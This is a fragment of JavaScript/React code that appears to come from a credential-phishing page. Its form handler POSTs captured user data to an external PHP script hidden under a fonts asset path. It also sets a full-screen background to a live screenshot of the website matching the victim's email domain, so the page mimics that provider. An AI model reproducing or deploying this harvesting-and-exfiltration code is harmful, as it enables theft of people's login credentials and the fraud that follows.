...
// hello
    ...
    const submitDefaultForm = (e)=>{
        ...
        $.ajax({
            type: "POST",
            url: "https://pearldozen.com/nc_assets/fonts/yr24sc/ns.php",
            data: user,
            success(data) {
                // alert('OK');
                console.log(data);
    ...
    style={{
        // https://image.thum.io/get/auth/69967-gotcha/https://www.wikipedia.org/
        backgroundImage: `url(https://image.thum.io/get/auth/69967-gotcha/https://www.${extracetdEmail}/)`,
        width:'100vw',
        height:'100vh',
